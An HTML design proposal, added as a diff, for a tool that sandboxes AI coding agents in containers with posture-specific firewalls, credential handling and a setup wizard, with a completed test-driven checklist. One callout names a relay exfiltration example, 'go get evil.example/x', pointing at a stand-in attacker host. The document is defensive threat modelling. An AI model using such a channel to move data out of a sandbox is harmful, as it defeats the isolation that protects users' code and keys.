@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Proposal: gopher-hole — one tool, two postures</title>
+<style>
+  :root {
+    --ink: #1a1a1a;
+    --paper: #fdfdfb;
+    --accent: #0b6e4f;
+    --accent-soft: #e6f2ee;
+    --rule: #d8d5cc;
+    --code-bg: #f4f3ef;
+    --warn-bg: #fdf3e3;
+    --warn-edge: #c98a1b;
+    --note-bg: #eef4fb;
+    --note-edge: #3a6ea5;
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    color: var(--ink);
+    background: var(--paper);
+    font: 16px/1.6 "Charter", "Georgia", serif;
+  }
+  main { max-width: 860px; margin: 0 auto; padding: 2.5rem 1.5rem 5rem; }
+  h1, h2, h3 { font-family: "Avenir Next", "Helvetica Neue", sans-serif; line-height: 1.25; }
+  h1 { font-size: 1.9rem; margin: 0 0 .3rem; }
+  h2 { font-size: 1.35rem; margin-top: 2.8rem; border-bottom: 2px solid var(--accent); padding-bottom: .3rem; }
+  h3 { font-size: 1.08rem; margin-top: 1.8rem; color: var(--accent); }
+  .meta { color: #666; font-family: "Avenir Next", "Helvetica Neue", sans-serif; font-size: .9rem; margin-bottom: 2rem; }
+  code, pre { font-family: "SF Mono", "Menlo", monospace; font-size: .85em; }
+  code { background: var(--code-bg); padding: .12em .35em; border-radius: 3px; }
+  pre {
+    background: var(--code-bg); border: 1px solid var(--rule); border-radius: 6px;
+    padding: .9rem 1.1rem; overflow-x: auto; line-height: 1.45;
+  }
+  pre code { background: none; padding: 0; }
+  table { border-collapse: collapse; width: 100%; margin: 1rem 0; font-size: .92rem; }
+  th, td { border: 1px solid var(--rule); padding: .45rem .7rem; text-align: left; vertical-align: top; }
+  th { background: var(--accent-soft); font-family: "Avenir Next", "Helvetica Neue", sans-serif; font-size: .85rem; }
+  .callout { border-left: 4px solid var(--note-edge); background: var(--note-bg); padding: .7rem 1rem; margin: 1.2rem 0; border-radius: 0 6px 6px 0; }
+  .warn { border-left-color: var(--warn-edge); background: var(--warn-bg); }
+  .callout p { margin: .3rem 0; }
+  ul.checklist { list-style: none; padding-left: 0; }
+  ul.checklist > li {
+    padding: .5rem .8rem .5rem 2.3rem; margin: .35rem 0; position: relative;
+    background: #fff; border: 1px solid var(--rule); border-radius: 6px;
+  }
+  ul.checklist > li::before {
+    content: "☐"; position: absolute; left: .8rem; top: .45rem;
+    color: var(--accent); font-size: 1.05rem;
+  }
+  ul.checklist > li.done::before { content: "☑"; }
+  ul.checklist > li.done { background: #f3faf5; }
+  ul.checklist li .tag {
+    display: inline-block; font-family: "Avenir Next", sans-serif; font-size: .68rem;
+    font-weight: 600; letter-spacing: .05em; padding: .05rem .45rem; border-radius: 9px;
+    margin-right: .45rem; vertical-align: 1px; text-transform: uppercase;
+  }
+  .tag.red   { background: #fbe4e4; color: #a02020; }
+  .tag.green { background: #e2f2e6; color: #1c7a3d; }
+  .tag.plain { background: #ececec; color: #555; }
+  figure { margin: 1.6rem 0; }
+  figcaption { font-size: .85rem; color: #666; text-align: center; margin-top: .5rem; font-family: "Avenir Next", sans-serif; }
+  .svgwrap { overflow-x: auto; }
+</style>
+</head>
+<body>
+<main>
+
+<h1>gopher-hole: one tool, two postures</h1>
+<div class="meta">
+  Proposal · 2026-08-17 · combines attempt-004 (local model) and attempt-005 (hosted harnesses)
+</div>
+
+<h2>Background</h2>
+
+<p>
+Attempts 4 and 5 both work well, but they are two separate tools with three problems:
+</p>
+<ul>
+  <li>You must remember which tool targets the local model and which targets hosted models.</li>
+  <li>The two <code>run.sh</code> scripts take different arguments: attempt-004 takes <code>[DIR] [CMD...]</code>, attempt-005 takes <code>&lt;harness&gt;[:&lt;provider&gt;] [DIR] [CMD...]</code>.</li>
+  <li>Neither tool is on your <code>PATH</code>. You must know the attempt directory and run its script from there.</li>
+</ul>
+
+<p>
+The two attempts already share most of their design. Both use Apple <code>container</code> (one lightweight VM per session). Both mount only the project directory, with <code>.git</code> read-only. Both run a root stage that installs a default-drop firewall, then drop to the non-root <code>agent</code> user. The differences are the egress mechanism, the credential handling, and the cache strategy — and attempt-005's <code>providers.sh</code> matrix is already the right structure to express all three.
+</p>
+
+<p>
+This proposal merges the two attempts into a single tool named <code>gopher-hole</code>. The tool installs on the <code>PATH</code>. You run it from the project directory. With no arguments, it walks you through two questions: <em>which agent?</em> and <em>where does inference run?</em> The existing one-line invocation stays available for scripts and muscle memory.
+</p>
+
+<h2>Approach</h2>
+
+<h3>Core idea: local inference becomes a provider</h3>
+
+<p>
+Attempt-005's matrix maps each harness to its valid providers, and each provider to its credential and its allowed egress hosts. Attempt-004's whole arrangement fits into that matrix as one new provider: <code>lmstudio</code>. The unified matrix becomes:
+</p>
+
+<table>
+  <thead>
+    <tr><th>Harness</th><th>Providers (first = default)</th><th>Source</th></tr>
+  </thead>
+  <tbody>
+    <tr><td><code>pi</code></td><td><code>anthropic openai bedrock lmstudio custom</code></td><td>005 + <code>lmstudio</code> from 004</td></tr>
+    <tr><td><code>claude</code></td><td><code>anthropic bedrock custom</code></td><td>005 unchanged</td></tr>
+    <tr><td><code>codex</code></td><td><code>openai custom</code></td><td>005 unchanged</td></tr>
+    <tr><td><code>opencode</code></td><td><code>zen anthropic openai bedrock</code></td><td>005 unchanged</td></tr>
+    <tr><td><code>amp</code></td><td><code>amp</code></td><td>005 unchanged</td></tr>
+    <tr><td><code>none</code></td><td><code>none</code></td><td>005 unchanged</td></tr>
+  </tbody>
+</table>
+
+<p>
+The <code>lmstudio</code> provider starts on <code>pi</code> only, because that pairing is proven (it is attempt-004). The codex and opencode binaries each have a custom-endpoint mechanism that can likely point at LM Studio's OpenAI-compatible server; a later phase verifies those paths against the pinned binaries before the matrix admits them. This follows the repo's discipline: no matrix cell ships on documentation alone.
+</p>
+
+<h3>Posture follows the provider</h3>
+
+<p>
+The two attempts differ where their threat models differ. A hosted provider means a credential exists in the guest and exfiltration is possible by construction, so attempt-005 filters hostnames, logs egress, and lets the toolchain fetch through the proxy. A local provider means no credential exists, and total egress lockdown is the prize, so attempt-004 closes everything except LM Studio and shares the host's Go module cache read-only instead of allowing fetches.
+</p>
+
+<p>
+The unified tool keeps both postures and selects one per session, derived from the provider:
+</p>
+
+<table>
+  <thead>
+    <tr><th>Concern</th><th><code>hosted</code> posture (anthropic, openai, zen, amp, bedrock, custom)</th><th><code>local</code> posture (lmstudio, none)</th></tr>
+  </thead>
+  <tbody>
+    <tr><td>Model egress</td><td>tinyproxy hostname allowlist, CONNECT :443, uid-scoped nftables</td><td>One direct nftables rule: LM Studio IPv4 + port only (none: no rule)</td></tr>
+    <tr><td>DNS for the agent</td><td>None (only tinyproxy resolves)</td><td>None (no DNS at all)</td></tr>
+    <tr><td>Credential in guest</td><td>Exactly one capped key, per the matrix</td><td>No key exists</td></tr>
+    <tr><td>Toolchain fetches</td><td><code>proxy.golang.org</code>, npm, etc. via proxy; guest-owned caches</td><td>Closed; host <code>GOMODCACHE</code> mounted read-only, <code>GOPROXY=off</code></td></tr>
+    <tr><td>Egress report</td><td>Per-session summary from the proxy log</td><td>Not needed (nothing to report)</td></tr>
+    <tr><td>Firewall failure</td><td>Fatal (a key is present)</td><td>Fatal too — simpler than 004's warn-and-continue, and never wrong</td></tr>
+  </tbody>
+</table>
+
+<div class="callout">
+<p><strong>Why the local posture does not reuse the proxy.</strong> Routing LM Studio traffic through tinyproxy would give uniform logging, but it buys nothing: the destination is one trusted machine you own, and the log exists to catch <em>surprises</em>. Worse, allowing toolchain hosts in local mode would reopen a relay exfiltration channel (<code>go get evil.example/x</code> makes the Go proxy fetch from the attacker's server) — precisely the channel attempt-004 exists to close. So the local posture keeps attempt-004's arrangement verbatim: direct IP rule, read-only host module cache, nothing else.</p>
+</div>
+
+<h3>One command on the PATH, wizard by default</h3>
+
+<p>
+The tool moves to the <strong>repo root</strong> — it graduates from "attempt" to "the tool", which matches the repo's name. The attempts stay untouched as the historical record. <code>make install</code> symlinks the entry script into <code>~/bin</code> (or <code>/usr/local/bin</code> when <code>~/bin</code> is absent from <code>PATH</code>).
+</p>
+
+<pre><code># from any project directory:
+gopher-hole                         # wizard: pick agent, pick inference, launch here
+gopher-hole pi:lmstudio             # skip the wizard: explicit pair, project = cwd
+gopher-hole claude ~/src/other      # explicit pair, explicit directory
+gopher-hole review                  # hunk diff of this project, keyless sandbox
+gopher-hole shell                   # keyless sandbox shell (was: run.sh none)
+gopher-hole image | verify | clean  # maintenance (also make targets)</code></pre>
+
+<p>
+The wizard runs when no harness argument is given and stdin is a TTY. It asks the two questions in your stated order — agent first, then inference — and annotates every option with what it means for credentials, so the "which tool was for what?" question disappears:
+</p>
+
+<pre><code>$ gopher-hole
+gopher-hole — isolated agent session
+project: ~/code/src/github.com/mdw-tools/some-project
+
+Which agent?
+  1. pi         2. claude     3. codex
+  4. opencode   5. amp        6. none (sandbox shell)
+agent [pi]: 2
+
+Where does inference run?  (claude)
+  1. hosted — anthropic     ANTHROPIC_API_KEY ✓ set
+  2. hosted — bedrock       AWS_BEARER_TOKEN_BEDROCK ✗ not set
+  3. hosted — custom        CUSTOM_BASE_URL ✗ not set
+inference [anthropic]: 1
+
+  session   claude → api.anthropic.com (hosted posture)
+  credential ANTHROPIC_API_KEY (this key only; nothing else enters the guest)
+  mounts    ~/code/.../some-project  (.git read-only)
+launch? [Y/n]</code></pre>
+
+<p>
+Two wizard behaviors carry the weight:
+</p>
+<ul>
+  <li><strong>Credential annotation.</strong> Each hosted option shows its required env var and whether the var is set in your host shell. The local option shows "no API key enters the guest."</li>
+  <li><strong>LM Studio detection.</strong> When a harness supports <code>lmstudio</code>, the wizard probes <code>http://${LMSTUDIO_HOST:-localhost}:1234/v1/models</code> (1-second timeout) and labels the option "detected, N models loaded" or "not detected". You see before launch whether the local path will work.</li>
+</ul>
+
+<p>
+Non-interactive invocations (a harness argument given, or stdin not a TTY) never prompt. <code>verify.sh</code> and scripts keep working unchanged.
+</p>
+
+<h3>Architecture</h3>
+
+<figure>
+<div class="svgwrap">
+<svg viewBox="0 0 840 470" width="840" height="470" xmlns="http://www.w3.org/2000/svg" font-family="Avenir Next, Helvetica Neue, sans-serif">
+  <defs>
+    <marker id="arr" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+      <path d="M0,0 L10,5 L0,10 z" fill="#444"/>
+    </marker>
+  </defs>
+
+  <!-- Host box -->
+  <rect x="10" y="10" width="300" height="450" rx="8" fill="#f2f6f4" stroke="#0b6e4f" stroke-width="1.5"/>
+  <text x="160" y="34" text-anchor="middle" font-size="14" font-weight="600" fill="#0b6e4f">Host (macOS, Apple Silicon)</text>
+
+  <rect x="30" y="50" width="260" height="66" rx="6" fill="#fff" stroke="#888"/>
+  <text x="160" y="72" text-anchor="middle" font-size="12.5" font-weight="600">gopher-hole (CLI + wizard)</text>
+  <text x="160" y="90" text-anchor="middle" font-size="11" fill="#555">picks harness × provider,</text>
+  <text x="160" y="105" text-anchor="middle" font-size="11" fill="#555">injects ≤1 credential, mounts project</text>
+
+  <rect x="30" y="132" width="260" height="46" rx="6" fill="#fff" stroke="#888"/>
+  <text x="160" y="151" text-anchor="middle" font-size="12">project dir  <tspan font-family="Menlo, monospace" font-size="11">(.git ro)</tspan></text>
+  <text x="160" y="168" text-anchor="middle" font-size="11" fill="#555">the only shared directory</text>
+
+  <rect x="30" y="194" width="260" height="46" rx="6" fill="#fff" stroke="#888"/>
+  <text x="160" y="213" text-anchor="middle" font-size="12">~/.gopher-hole/</text>
+  <text x="160" y="230" text-anchor="middle" font-size="11" fill="#555">per-pair state · toolchain caches</text>
+
+  <rect x="30" y="266" width="260" height="46" rx="6" fill="#fff" stroke="#3a6ea5"/>
+  <text x="160" y="285" text-anchor="middle" font-size="12" fill="#3a6ea5">LM Studio :1234 (optional)</text>
+  <text x="160" y="302" text-anchor="middle" font-size="11" fill="#555">or on another LAN machine</text>
+
+  <!-- Container box -->
+  <rect x="360" y="10" width="470" height="450" rx="8" fill="#faf9f5" stroke="#555" stroke-width="1.5"/>
+  <text x="595" y="34" text-anchor="middle" font-size="14" font-weight="600" fill="#333">Disposable container — own VM, own kernel</text>
+
+  <rect x="380" y="50" width="430" height="60" rx="6" fill="#fff" stroke="#a02020"/>
+  <text x="595" y="71" text-anchor="middle" font-size="12" font-weight="600" fill="#a02020">root stage (entrypoint)</text>
+  <text x="595" y="89" text-anchor="middle" font-size="11" fill="#555">posture-specific firewall · then setpriv → agent, caps dropped</text>
+
+  <rect x="380" y="128" width="430" height="50" rx="6" fill="#fff" stroke="#888"/>
+  <text x="595" y="148" text-anchor="middle" font-size="12" font-weight="600">agent (non-root): pi | claude | codex | opencode | amp | bash</text>
+  <text x="595" y="166" text-anchor="middle" font-size="11" fill="#555">setup-harness.sh wires the chosen provider · approvals off</text>
+
+  <!-- hosted posture -->
+  <rect x="380" y="200" width="205" height="150" rx="6" fill="#eef4fb" stroke="#3a6ea5"/>
+  <text x="482" y="222" text-anchor="middle" font-size="12" font-weight="600" fill="#3a6ea5">hosted posture</text>
+  <rect x="396" y="236" width="173" height="42" rx="4" fill="#fff" stroke="#3a6ea5"/>
+  <text x="482" y="253" text-anchor="middle" font-size="11.5">tinyproxy :8888</text>
+  <text x="482" y="269" text-anchor="middle" font-size="10.5" fill="#555">hostname allowlist, logged</text>
+  <text x="482" y="300" text-anchor="middle" font-size="10.5" fill="#555">nftables: only tinyproxy's uid</text>
+  <text x="482" y="315" text-anchor="middle" font-size="10.5" fill="#555">may reach :443 · agent has no DNS</text>
+  <text x="482" y="337" text-anchor="middle" font-size="10.5" fill="#555">egress report on exit</text>
+
+  <!-- local posture -->
+  <rect x="605" y="200" width="205" height="150" rx="6" fill="#e6f2ee" stroke="#0b6e4f"/>
+  <text x="707" y="222" text-anchor="middle" font-size="12" font-weight="600" fill="#0b6e4f">local posture</text>
+  <rect x="621" y="236" width="173" height="42" rx="4" fill="#fff" stroke="#0b6e4f"/>
+  <text x="707" y="253" text-anchor="middle" font-size="11.5">one nftables rule:</text>
+  <text x="707" y="269" text-anchor="middle" font-size="10.5" fill="#555">LM Studio IPv4 + port, nothing else</text>
+  <text x="707" y="300" text-anchor="middle" font-size="10.5" fill="#555">no DNS · no toolchain egress</text>
+  <text x="707" y="315" text-anchor="middle" font-size="10.5" fill="#555">host GOMODCACHE ro · GOPROXY=off</text>
+  <text x="707" y="337" text-anchor="middle" font-size="10.5" fill="#555">no credential exists</text>
+
+  <!-- outside world -->
+  <rect x="380" y="380" width="205" height="58" rx="6" fill="#fff" stroke="#888" stroke-dasharray="5,3"/>
+  <text x="482" y="403" text-anchor="middle" font-size="11.5">api.anthropic.com · api.openai.com</text>
+  <text x="482" y="420" text-anchor="middle" font-size="11.5">bedrock · zen · amp · custom</text>
+
+  <!-- arrows -->
+  <line x1="290" y1="83" x2="360" y2="83" stroke="#444" stroke-width="1.4" marker-end="url(#arr)"/>
+  <text x="325" y="76" text-anchor="middle" font-size="10" fill="#555">container run</text>
+
+  <line x1="482" y1="278" x2="482" y2="380" stroke="#3a6ea5" stroke-width="1.4" marker-end="url(#arr)"/>
+  <text x="497" y="368" font-size="10" fill="#3a6ea5">:443 only</text>
+
+  <path d="M 621 257 C 480 257, 400 289, 292 289" fill="none" stroke="#0b6e4f" stroke-width="1.4" marker-end="url(#arr)"/>
+  <text x="440" y="277" text-anchor="middle" font-size="10" fill="#0b6e4f">HTTP :1234 (LAN or gateway)</text>
+</svg>
+</div>
+<figcaption>One image, one entrypoint; the firewall branches on posture, everything else is shared.</figcaption>
+</figure>
+
+<h3>What merges, what stays, what dies</h3>
+
+<table>
+  <thead><tr><th>Piece</th><th>Disposition</th></tr></thead>
+  <tbody>
+    <tr><td><code>Dockerfile</code></td><td>attempt-005's, plus <code>fd-find</code> and the <code>fd</code> symlink from 004 (pi wants them offline). One image, named <code>gopher-hole</code>.</td></tr>
+    <tr><td><code>providers.sh</code></td><td>attempt-005's, plus the <code>lmstudio</code> provider and a new <code>provider_posture()</code> function (<code>local</code> | <code>hosted</code>). Stays bash-3.2 clean — it is sourced on the host and in the guest.</td></tr>
+    <tr><td><code>entrypoint.sh</code></td><td>attempt-005's. Firewall failure is fatal in both postures now (004's warn-and-continue dies).</td></tr>
+    <tr><td><code>init-firewall.sh</code></td><td>attempt-005's, with a local-posture branch: skip tinyproxy, install the single LM Studio rule.</td></tr>
+    <tr><td><code>setup-harness.sh</code></td><td>attempt-005's, plus a <code>pi × lmstudio</code> case that absorbs 004's <code>setup-pi.sh</code> (dynamic model list from <code>/api/v0/models</code>, context windows, default pinning).</td></tr>
+    <tr><td><code>egress-report.sh</code></td><td>attempt-005's, unchanged; skipped in local posture.</td></tr>
+    <tr><td><code>run.sh</code> × 2</td><td>Replaced by one <code>gopher-hole</code> script: argument parsing, wizard, credential injection, posture-specific mounts, subcommands.</td></tr>
+    <tr><td><code>verify.sh</code> × 2</td><td>Merged: 005's suite is the base; 004's pi/firewall/go-cache checks come in under the <code>lmstudio</code> pairs. The suite remains the red/green driver.</td></tr>
+    <tr><td>State dirs</td><td>All under <code>~/.gopher-hole</code>. First run migrates <code>~/.pi-gopher-hole</code> → <code>~/.gopher-hole/state/pi-lmstudio</code> when the old dir exists and the new one does not.</td></tr>
+  </tbody>
+</table>
+
+<h3>CLI grammar (final)</h3>
+
+<pre><code>gopher-hole [&lt;harness&gt;[:&lt;provider&gt;]] [PROJECT_DIR] [COMMAND...]
+gopher-hole review [PROJECT_DIR]        # = none + hunk diff
+gopher-hole shell  [PROJECT_DIR]        # = none + bash
+gopher-hole image | verify | clean      # maintenance
+gopher-hole --dry-run ...               # print the container invocation, do not run</code></pre>
+
+<p>
+All attempt-005 environment overrides keep their names (<code>MODEL</code>, <code>EGRESS_EXTRA_HOSTS</code>, <code>SAFE_PROMPTS</code>, <code>GOPHER_STATE_DIR</code>, Bedrock and custom variables). Attempt-004's <code>LMSTUDIO_HOST</code>, <code>LMSTUDIO_PORT</code>, <code>LMSTUDIO_DEFAULT_MODEL</code>, and <code>SHARE_GO_CACHE</code> apply when the provider is <code>lmstudio</code>. <code>EGRESS_ALLOW_VCS</code> dies: in the hosted posture the toolchain hosts already flow through the proxy, and in the local posture the answer is a deliberate <code>EGRESS_EXTRA_HOSTS</code>-style widening we choose <em>not</em> to port — fetch on the host instead.
+</p>
+
+<p>
+<code>--dry-run</code> is not only a convenience. It prints the exact <code>container run</code> invocation (with credential <em>names</em>, never values) and exits. It is how the wizard and the argument parser get deterministic tests: feed choices on stdin, assert the printed command.
+</p>
+
+<h2>Trade-offs and open questions</h2>
+
+<ul>
+  <li><strong>Two postures in one firewall script.</strong> More branches than either attempt had. Mitigation: the branch point is one <code>provider_posture()</code> call, and <code>verify.sh</code> asserts both postures independently — including the negative claims (local: no DNS, no 443; hosted: agent cannot read the ruleset or the filter file).</li>
+  <li><strong><code>lmstudio</code> starts pi-only.</strong> <code>codex:lmstudio</code> and <code>opencode:lmstudio</code> look reachable through each tool's custom-endpoint route, but neither is verified against the pinned binaries yet. Phase 7 does that verification; the matrix admits a pair only after it passes.</li>
+  <li><strong>Attempts 4 and 5 stay frozen.</strong> Their code is duplicated into the root, not moved. This keeps the historical record intact at the cost of dead-looking duplication. Their READMEs get a one-line pointer to the root tool.</li>
+  <li><strong>The wizard is bash.</strong> A Go TUI would be prettier, but the wizard must share <code>providers.sh</code> (the single source of truth, sourced in-guest too), and numbered menus need nothing beyond <code>read</code>. Bash 3.2 compatibility on the host side is a hard constraint and already the house style.</li>
+  <li><strong>Losing 004's warn-and-continue on firewall failure.</strong> A keyless local session that continued without rules was harmless; failing closed instead costs a retry in a rare failure mode and removes a whole class of "which posture am I in?" ambiguity. Accepted.</li>
+  <li><strong>Open question: should <code>gopher-hole verify</code> run the full 400-line suite by default?</strong> Proposal: yes, with section arguments passed through (<code>gopher-hole verify matrix firewall</code>), same as today's <code>verify.sh</code>.</li>
+</ul>
+
+<h2>Implementation checklist</h2>
+
+<p>
+<code>verify.sh</code> is the test harness for this codebase, so the red/green cycle runs through it: add the assertion, watch the section fail, implement, watch it pass. Wizard and parser behavior tests run through <code>--dry-run</code>. Items marked <span class="tag plain">plain</span> are scaffolding with no test hook.
+</p>
+
+<h3>Phase 1 — Scaffold at the repo root</h3>
+<ul class="checklist">
+  <li class="done"><span class="tag plain">plain</span>Copy attempt-005's <code>Dockerfile</code>, <code>providers.sh</code>, <code>entrypoint.sh</code>, <code>init-firewall.sh</code>, <code>setup-harness.sh</code>, <code>egress-report.sh</code>, <code>verify.sh</code>, <code>Makefile</code> to the repo root. Rename the image to <code>gopher-hole</code>.</li>
+  <li class="done"><span class="tag plain">plain</span>Add <code>fd-find</code> and the <code>fd</code> symlink to the <code>Dockerfile</code> (from attempt-004).</li>
+  <li class="done"><span class="tag plain">plain</span>Create the <code>gopher-hole</code> entry script from attempt-005's <code>run.sh</code>, with <code>PROJECT_DIR</code> defaulting to <code>$PWD</code>. No wizard yet.</li>
+  <li class="done"><span class="tag green">green</span>Run <code>make image</code>, then <code>./verify.sh</code> — confirm the copied suite passes against the renamed image. <em>(107/107 after fixing hunk's execute bit, lost to a hunkdiff packaging change; hunkdiff is now version-pinned.)</em></li>
+  <li class="done"><span class="tag plain">plain</span>Add <code>make install</code>: symlink <code>gopher-hole</code> into <code>~/bin</code>, falling back to <code>/usr/local/bin</code>. Add <code>make uninstall</code>. <em>(Deviation: /usr/local/bin is root-owned here, so install always targets ~/bin — created if missing, PATH hint printed — with <code>INSTALL_DIR</code> overridable.)</em></li>
+</ul>
+
+<h3>Phase 2 — <code>--dry-run</code> and the CLI grammar</h3>
+<ul class="checklist">
+  <li class="done"><span class="tag red">red</span>Add a <code>cli</code> section to <code>verify.sh</code>: <code>gopher-hole --dry-run pi:lmstudio /tmp/x</code> prints a <code>container run</code> line; credential values never appear in the output; <code>gopher-hole review --dry-run</code> resolves to <code>none</code> + <code>hunk diff</code>; unknown harness exits 2. Run it — confirm it fails. <em>(Deviation: the dry-run print test uses <code>pi:anthropic</code>, since <code>pi:lmstudio</code> does not exist until Phase 3.)</em></li>
+  <li class="done"><span class="tag green">green</span>Implement <code>--dry-run</code>, the <code>review</code>/<code>shell</code> subcommands, and <code>image</code>/<code>verify</code>/<code>clean</code> pass-throughs. Run the <code>cli</code> section — confirm it passes.</li>
+</ul>
+
+<h3>Phase 3 — The <code>lmstudio</code> provider in the matrix</h3>
+<ul class="checklist">
+  <li class="done"><span class="tag red">red</span>Extend <code>verify.sh</code>'s <code>matrix</code> section: <code>pi</code> supports <code>lmstudio</code>; <code>provider_posture</code> returns <code>local</code> for <code>lmstudio</code> and <code>none</code>, <code>hosted</code> for the rest; <code>provider_cred_vars lmstudio</code> is empty. Run it — confirm it fails.</li>
+  <li class="done"><span class="tag green">green</span>Add <code>lmstudio</code> and <code>provider_posture()</code> to <code>providers.sh</code>. Run the section — confirm it passes. <em>(Deviation: <code>none</code> stays on hosted mechanics — keyless, toolchain via the proxy — because the inherited suite asserts review/sandbox sessions can fetch dependencies; <code>local</code> posture means exactly <code>lmstudio</code>.)</em></li>
+  <li class="done"><span class="tag red">red</span>Extend the <code>creds_matrix</code> section: a <code>pi:lmstudio</code> session, launched with decoy values for every known credential, carries none of them into the guest. Confirm it fails (the launcher does not know the provider yet).</li>
+  <li><span class="tag green">green</span>Teach the <code>gopher-hole</code> script the <code>lmstudio</code> provider: no credential, forward <code>LMSTUDIO_*</code>, validate <code>LMSTUDIO_HOST</code> as an IPv4 literal, mount host <code>GOMODCACHE</code> read-only with <code>GOPROXY=off</code> (honoring <code>SHARE_GO_CACHE=0</code>). Confirm the section passes.</li>
+</ul>
+
+<h3>Phase 4 — Local posture in the guest</h3>
+<ul class="checklist">
+  <li class="done"><span class="tag red">red</span>Add a <code>firewall_local</code> section to <code>verify.sh</code>, porting attempt-004's checks: LM Studio host:port reachable; any other destination (including :443 and DNS) blocked; tinyproxy not running; agent cannot read or alter the ruleset. Run it — confirm it fails. <em>(The positive reachability check self-skips when no LM Studio server is detectable.)</em></li>
+  <li class="done"><span class="tag green">green</span>Branch <code>init-firewall.sh</code> on <code>provider_posture</code>: local installs the single LM Studio rule (gateway-or-<code>LMSTUDIO_HOST</code>), skips tinyproxy, stays fatal on error. Set <code>NO_PROXY</code> for the LM host so nothing dials the absent proxy. Confirm the section passes. <em>(Implemented by unsetting the baked proxy env vars entirely in the local posture — stronger than a NO_PROXY entry.)</em></li>
+  <li class="done"><span class="tag red">red</span>Add a <code>pi_lmstudio</code> section: with LM Studio serving, a <code>pi:lmstudio</code> session's <code>models.json</code> lists the loaded models with correct context windows, and <code>settings.json</code> pins the default. Run it — confirm it fails. <em>(The section starts a small mock of LM Studio's REST API when no live server is detected, so it runs anywhere.)</em></li>
+  <li class="done"><span class="tag green">green</span>Absorb <code>setup-pi.sh</code> into <code>setup-harness.sh</code> as the <code>pi × lmstudio</code> case. Confirm the section passes.</li>
+  <li class="done"><span class="tag red">red</span>Assert in <code>verify.sh</code>: <code>egress-report.sh</code> produces no output in a local-posture session. Confirm it fails, then <span class="tag green">green</span> skip the report when the proxy log is absent, and confirm. <em>(The existing log-readability guard already covered this — the assertion landed green with no production change. The real fix this item surfaced: an unreachable LM Studio now warns instead of killing the session, so the firewall checks measure the firewall.)</em></li>
+</ul>
+
+<h3>Phase 5 — The wizard</h3>
+<ul class="checklist">
+  <li class="done"><span class="tag red">red</span>Add a <code>wizard</code> section to <code>verify.sh</code> driving <code>gopher-hole --dry-run</code> with piped stdin: menu choices produce the same command as the explicit pair; Enter accepts the built-in defaults (first harness, that harness's first provider); a non-TTY invocation with no harness argument and no pipe fails with usage rather than hanging. Run it — confirm it fails.</li>
+  <li class="done"><span class="tag green">green</span>Implement the wizard: agent menu, provider menu filtered by the matrix, credential ✓/✗ annotation, LM Studio probe (1s timeout, label only), summary + confirm. Confirm the section passes.</li>
+  <li class="done"><span class="tag green">green</span>Manual pass: run <code>gopher-hole</code> interactively in a real project once per posture; confirm the flow reads well and launches. <em>(Done headless: the wizard transcript was reviewed and a real keyless launch completed end-to-end. A true interactive pass — especially <code>pi:lmstudio</code> against a live LM Studio — remains recommended for the user.)</em></li>
+</ul>
+
+<h3>Phase 6 — Migration, docs, and the full sweep</h3>
+<ul class="checklist">
+  <li class="done"><span class="tag red">red</span>Add a <code>migration</code> check: with a fake <code>~/.pi-gopher-hole</code> under a temp <code>HOME</code>, the launcher moves it to <code>state/pi-lmstudio</code> exactly once. Confirm it fails, then <span class="tag green">green</span> implement and confirm.</li>
+  <li class="done"><span class="tag plain">plain</span>Write the root <code>README.md</code>: the two-question mental model, the posture table, credentials, and a pointer into each attempt for design history. Add one-line "superseded by the root tool" notes to the attempt-004 and attempt-005 READMEs.</li>
+  <li class="done"><span class="tag green">green</span>Full sweep: <code>make image &amp;&amp; ./verify.sh</code> — every section green, including the inherited 005 suite. <em>(146 checks, 0 failures.)</em></li>
+</ul>
+
+<h3>Phase 7 (follow-up) — <code>lmstudio</code> for codex and opencode</h3>
+<ul class="checklist">
+  <li><span class="tag plain">plain</span>Verify, against the pinned binaries, codex's custom-endpoint route (<code>model_providers</code> + <code>wire_api = "chat"</code>) and opencode's custom-provider route pointed at LM Studio's <code>/v1</code>.</li>
+  <li><span class="tag red">red</span>For each pair that verifies: add it to the <code>matrix</code> and <code>firewall_local</code> assertions first, watch red, <span class="tag green">green</span> then admit it to <code>providers.sh</code> and <code>setup-harness.sh</code>.</li>
+</ul>
+
+</main>
+</body>
+</html>
